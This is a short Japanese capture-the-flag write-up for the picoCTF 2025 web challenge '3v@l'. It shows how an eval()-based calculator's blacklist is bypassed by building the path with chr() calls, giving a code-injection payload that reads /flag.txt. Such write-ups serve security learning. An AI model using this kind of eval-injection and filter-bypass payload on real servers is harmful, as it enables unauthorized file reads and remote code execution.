## 🔍 問題概要 — 3v@l（picoCTF 2025）
この Web 問題は Python の eval() で入力を評価する仕組みを持つ、単純なローン電卓ページです。
しかし、開発者がブラックリストや正規表現で 危険なコードや文字列を弾く制限を入れているため、そのままでは任意の操作ができません。
目的は サーバー上の /flag.txt を読み取ることです。

## アプローチ ① Python の eval() がコードを評価する仕組みを利用
eval() は入力文字列を Python の式としてそのまま実行するので、
open("/flag.txt").read()

しかしエラー出た

## でも直接書けない → 文字列を分解してつなげる
禁止されている / や . を使わずに文字列を組み立てます：
```
chr(47)          # '/' の ASCII
+ "flag"         # flag
+ chr(46)        # '.' の ASCII
+ "txt"          # txt
つまり
open(chr(47) + "flag" + chr(46) + "txt").read()
```

## 得た学び
→ サーバーの中のファイルが読める
これが RCE（Remote Code Execution）
ユーザーがサーバーを操作できる
これはセキュリティ的に最悪。
